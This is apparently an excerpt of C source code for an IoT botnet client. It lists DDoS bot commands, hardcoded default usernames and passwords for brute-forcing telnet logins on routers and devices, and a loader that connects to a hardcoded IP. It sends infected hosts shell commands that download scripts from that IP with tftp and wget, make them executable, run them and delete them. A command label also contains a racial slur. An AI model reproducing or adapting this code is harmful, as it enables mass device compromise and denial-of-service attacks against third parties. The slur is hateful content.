...
!* COMBO <target> <port> <time>
!* STOP
!* FUCKOFFNIGGER (KILLS ALL BOTS)
...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "netgear\0", "cisco\0", "ubnt\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "netgear\0", "cisco\0", "ubnt\0"};
//    ___  ___  __      __  ___
//   / __\/ _ \/__\  /\ \ \/ _ \
//  / _\ / /_)/ \// /  \/ / /_\/
// / /  / ___/ _  \/ /\  / /_\\
...
/*  ______________  ______     __    ____  ___    ____  __________ 
   / ____/ ____/ / / / __ \   / /   / __ \/   |  / __ \/ ____/ __ \
  / __/ / /   / /_/ / / / /  / /   / / / / /| | / / / / __/ / /_/ /
 / /___/ /___/ __  / /_/ /  / /___/ /_/ / ___ |/ /_/ / /___/ _, _/ 
/_____/\____/_/ /_/\____/  /_____/\____/_/  |_/_____/_____/_/ |_| 
*/ 
...
void echoLoader()
{
        ...
        int fd;
        fd = socket_connect("46.19.142.138", 80); 
        write(fd, "GET /fuck1hex HTTP/1.0\r\n\r\n", strlen("GET /fuck1hex HTTP/1.0\r\n\r\n")); // write(fd, char[]*, len);  
...
void StartTheLelz(int nothing)
{
        ...
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt;busybox tftp 46.19.142.138 -c get tftp.sh || tftp 46.19.142.138 -c get tftp.sh;sh tftp.sh;busybox tftp -r tftp2.sh -g 46.19.142.138 || tftp -r tftp2.sh -g 46.19.142.138;sh tftp2.sh;busybox wget http://46.19.142.138/gtop.sh || wget http://46.19.142.138/gtop.sh;chmod +x gtop.sh || busybox chmod +x gtop.sh;sh gtop.sh\r\n", 366, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 11;
                                }
                                break;
						...
						case 10:
                                {
									    echoLoader();
                                        if(send(fds[i].fd, "chmod +x x || busybox chmod +x x;sh x;chmod +x z || busybox chmod +x z;./z;rm -rf z;rm -f x\r\n", 93, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 11;
                                }
                                break;		
...
void processCmd(int argc, unsigned char *argv[])
{
	int x;
        ...
        if(!strcmp(argv[0], "QWAPKVTAYMEEB"))
        {
                exit(0);
        }
}
